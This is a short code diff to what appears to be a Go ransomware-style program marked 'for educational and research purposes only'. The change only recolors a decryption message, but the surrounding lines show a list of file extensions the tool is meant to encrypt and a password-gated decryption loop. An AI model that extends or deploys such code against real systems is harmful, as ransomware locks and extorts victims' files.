@@ -57,6 +57,8 @@ func main() {
 	warn := color.Yellow.Sprint("For educational and research purposes only.")
 	// Password Prompt
 	decrypt := color.Magenta.Sprint("Enter Decryption Password:")
+	// Decrypted Files Array:
+	decryptFiles := color.Green.Sprint("The following files have been decrypted:")
 	// Only Encrypt these file extensions.
 	fileExtensions := []string{
 		"3dm", "max", "3ds", "uot", "stw", "sxw", "ott", "odt", "rpm",
@@ -119,7 +121,7 @@ func main() {
 		for _, file := range encryptedfiles {
 			// Decrypts files if password is correct.
 			enc := encryption.NewEncryption(file, key)
-			fmt.Println("The following files have been decrypted:")
+			color.Println(decryptFiles)
 			enc.DecryptFile()
 		}
 		fmt.Println(encryptedfiles)
